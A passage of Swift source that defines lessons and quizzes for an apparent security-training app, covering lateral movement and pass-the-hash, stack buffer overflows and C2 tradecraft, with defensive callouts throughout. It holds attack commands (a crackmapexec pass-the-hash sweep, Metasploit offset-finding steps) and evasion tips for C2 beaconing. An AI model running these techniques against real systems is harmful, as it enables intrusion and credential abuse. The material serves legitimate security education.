        minutes: 10,
        difficulty: .expert,
        blocks: [
            .heading("One box is a doorway, not the goal"),
            .paragraph("Rarely is your first foothold the crown jewels. Lateral movement is the art of reusing credentials and trust to hop from host to host, and **pivoting** is tunneling your tools *through* a compromised machine to reach networks you can't touch directly. Together they turn a single shell into domain-wide reach."),
            .animation(.lateralMovement, caption: "From a foothold, harvested credentials unlock the next host, then the next — a pivot tunnel routes traffic into a hidden internal subnet."),
            .keyPoints([
                "Pass-the-Hash — authenticate with an NTLM hash without ever cracking it.",
                "Pass-the-Ticket — reuse a stolen Kerberos ticket.",
                "Remote execution — PsExec, WMI, WinRM, SMB to run commands on the next host.",
                "Pivoting — SSH tunnels, Chisel, or Metasploit routes to reach internal-only subnets.",
                "Credential reuse — the same local-admin password across machines is the classic spread vector."
            ]),
            .terminal(prompt: "kali@lab",
                      command: "crackmapexec smb 10.10.10.0/24 -u admin -H aad3b...:31d6cfe0...",
                      output: """
SMB  10.10.10.21  [+] CORP\\admin (Pwn3d!)   <-- hash works here too
SMB  10.10.10.22  [+] CORP\\admin (Pwn3d!)
SMB  10.10.10.10  [+] CORP\\admin (Pwn3d!)   <-- domain controller
"""),
            .definition(term: "Pass-the-Hash (PtH)", meaning: "NTLM authentication proves you know the password's hash, not the password. So a stolen hash is as good as the password — you 'pass' it directly, no cracking required. This is why hash theft is catastrophic."),
            .callout(.tip, "Blue team: a flat network where one local-admin password unlocks everything is the dream scenario for lateral movement. LAPS (unique local-admin passwords), network segmentation, and tiered admin accounts break the chain."),
            .checkpoint(QuizQuestion(
                "Pass-the-Hash works because NTLM authentication…",
                options: [
                    "Sends the plaintext password",
                    "Proves knowledge of the password's hash, so the hash alone is sufficient to authenticate",
                    "Requires a smart card",
                    "Only works locally"
                ],
                correct: 1,
                why: "NTLM uses the hash as the secret. Possessing the hash lets you authenticate without ever knowing or cracking the plaintext — hence 'passing' the hash."))
        ],
        quiz: [
            QuizQuestion(
                "What problem does pivoting solve?",
                options: [
                    "Cracking passwords faster",
                    "Reaching internal networks/hosts that aren't directly routable from the attacker",
                    "Encrypting traffic",
                    "Bypassing MFA"
                ],
                correct: 1,
                why: "Pivoting tunnels traffic through a compromised host to access segments the attacker can't reach directly, extending their reach into the internal network."),
            QuizQuestion(
                "Which control most directly stops a single reused local-admin password from enabling network-wide lateral movement?",
                options: [
                    "Antivirus",
                    "LAPS (unique, rotated local-admin passwords per machine)",
                    "A longer screensaver timeout",
                    "Disabling Kerberos"
                ],
                correct: 1,
                why: "LAPS gives every machine a unique, random local-admin password, so compromising one host's hash no longer unlocks the rest.")
        ]
    )

    // MARK: R6 — Advanced exploitation & C2

    private static let advanced = Module(
        id: "red-advanced",
        title: "Advanced Exploitation & C2",
        summary: "Go under the hood: smash a stack to hijack execution, then run a covert command-and-control channel.",
        systemImage: "cpu.fill",
        lessons: [bofLesson, c2Lesson]
    )

    private static let bofLesson = Lesson(
        id: "red-buffer-overflow",
        title: "Stack Buffer Overflows",
        subtitle: "Overflow a buffer, overwrite the return address, and redirect a program's execution.",
        minutes: 13,
        difficulty: .expert,
        blocks: [
            .heading("Memory corruption, demystified"),
            .paragraph("When a program copies more data into a fixed-size buffer than it can hold, the excess spills over adjacent memory on the stack — including the saved **return address** that tells the CPU where to go when the function finishes. Control that address and you control execution. This is the foundation of binary exploitation and a rite of passage in offensive training."),
            .animation(.bufferOverflow, caption: "Input overruns a buffer and marches up the stack until it overwrites the saved return address — redirecting the CPU into attacker-controlled code."),
            .heading("Finding the offset"),
            .paragraph("You send a unique cyclic pattern, crash the program, and read which 4 bytes landed in the instruction pointer (EIP/RIP). That tells you exactly how many bytes precede the return address — the offset."),
            .terminal(prompt: "kali@lab",
                      command: "msf-pattern_create -l 600   →  crash  →  EIP = 39694438",
                      output: """
msf-pattern_offset -l 600 -q 39694438
[*] Exact match at offset 524
# 524 bytes of padding, then the next 4 bytes overwrite EIP
"""),
            .keyPoints([
                "Fuzz → crash → find offset → control EIP → redirect to your shellcode.",
                "A NOP sled (0x90...) gives your jump some slack to land in.",
                "Bad characters (null bytes, 0x0a) must be identified and avoided in the payload.",
                "Modern mitigations — DEP (no-execute stack), ASLR (randomized addresses), stack canaries — make naive overflows hard; bypasses (ROP) are the next chapter."
            ]),
            .definition(term: "Return address", meaning: "When a function is called, the CPU pushes the address to resume at afterward onto the stack. Overwriting it lets you choose where execution goes next — the heart of stack-overflow exploitation."),
            .callout(.warning, "Real-world targets ship DEP, ASLR and canaries, so a textbook 'jump to shellcode on the stack' usually won't work directly. Understanding the classic overflow is the mandatory foundation for the bypasses (ROP chains) that defeat those mitigations."),
            .checkpoint(QuizQuestion(
                "In a classic stack overflow, what does overwriting the saved return address let you do?",
                options: [
                    "Read the program's source code",
                    "Redirect the CPU to execute code of your choosing when the function returns",
                    "Crash the program harmlessly",
                    "Encrypt the stack"
                ],
                correct: 1,
                why: "The return address is where the CPU jumps when the function exits. Controlling it means controlling the instruction pointer — and therefore execution."))
        ],
        quiz: [
            QuizQuestion(
                "What is the purpose of a NOP sled in exploitation?",
                options: [
                    "To encrypt the payload",
                    "To give the jump target some slack so execution slides into the shellcode",
                    "To defeat ASLR",
                    "To find bad characters"
                ],
                correct: 1,
                why: "A run of no-operation instructions means that landing anywhere within it slides execution down into the shellcode, easing imprecise jumps."),
            QuizQuestion(
                "Which mitigation specifically prevents executing code placed on the stack?",
                options: ["ASLR", "DEP / NX (non-executable memory)", "Stack canary", "A firewall"],
                correct: 1,
                why: "DEP/NX marks the stack non-executable, so injected shellcode there won't run. ASLR randomizes addresses; canaries detect overwrites — each tackles a different aspect.")
        ]
    )

    private static let c2Lesson = Lesson(
        id: "red-c2",
        title: "Command & Control (C2)",
        subtitle: "How operators control implants covertly — and how that channel gives them away.",
        minutes: 10,
        difficulty: .expert,
        blocks: [
            .heading("The operator's remote control"),
            .paragraph("After landing an implant, the attacker needs a reliable, stealthy way to issue commands and receive output. That's Command & Control. Modern C2 frameworks (Cobalt Strike, Sliver, Mythic, Havoc) have implants **beacon** — check in periodically rather than holding an obvious open connection — and blend their traffic into normal web requests."),
            .animation(.c2Beacon, caption: "An implant beacons home on a jittered interval over HTTPS, pulls a task, runs it, and returns output — hiding in plain web traffic."),
            .keyPoints([
                "Beaconing — periodic check-ins (with random 'jitter') instead of a constant connection.",
                "Channels — HTTPS, DNS, even Slack/cloud services to look legitimate.",
                "Domain fronting / redirectors — hide the real C2 server behind trusted infrastructure.",
                "Malleable profiles — shape traffic to mimic a real app's requests.",
                "OPSEC — sleep long, jitter hard, encrypt everything, rotate infrastructure."
            ]),
            .callout(.lab, "Build a feel for this on a lab range with an open-source framework like Sliver: stand up a listener, generate an implant, run it on a VM you own, and watch the beacon check in. Authorized lab targets only."),
            .definition(term: "Beacon jitter", meaning: "Randomized variation added to the check-in interval so callbacks don't occur on a perfectly regular clock — defeating simple 'phones home every 60s exactly' detections."),
            .heading("How the blue team catches it"),
            .paragraph("Ironically, the C2 channel is often the best place to catch an intruder. Beaconing has a rhythm; even with jitter, statistical analysis (beacon analysis) spots the regularity. Newly-registered domains, rare TLS certificates, and unusual process→network behavior all betray it. You'll study this from the defender's seat in the Blue Team track."),
            .checkpoint(QuizQuestion(
                "Why do C2 implants beacon periodically instead of holding a persistent connection?",
                options: [
                    "It's faster",
                    "Periodic, jittered check-ins blend into normal traffic and avoid the obviousness of a long-lived connection",
                    "Firewalls require it",
                    "It uses less electricity"
                ],
                correct: 1,
                why: "A constant open channel to an unknown host is conspicuous. Short, jittered, encrypted check-ins that look like ordinary web traffic are far harder to spot."))
        ],
        quiz: [
            QuizQuestion(
                "Despite jitter, network defenders can often detect C2 by…",
                options: [
                    "Reading the encrypted payload",
                    "Statistical beacon analysis plus signals like newly-registered domains and odd process/network behavior",
                    "Asking the attacker politely",
                    "Disabling HTTPS"
                ],
                correct: 1,
                why: "Beaconing leaves a statistical rhythm, and the surrounding infrastructure (young domains, rare certs) and host behavior provide detectable signals even when the payload itself is encrypted."),
            QuizQuestion(
                "What is a redirector in C2 infrastructure for?",
                options: [
                    "Speeding up the implant",
                    "Hiding the real C2 server behind trusted-looking infrastructure",
                    "Cracking passwords",
                    "Encrypting the disk"
                ],
                correct: 1,
                why: "Redirectors sit between victims and the team server, masking the true C2 location and making takedown and attribution harder.")
        ]
    )
}
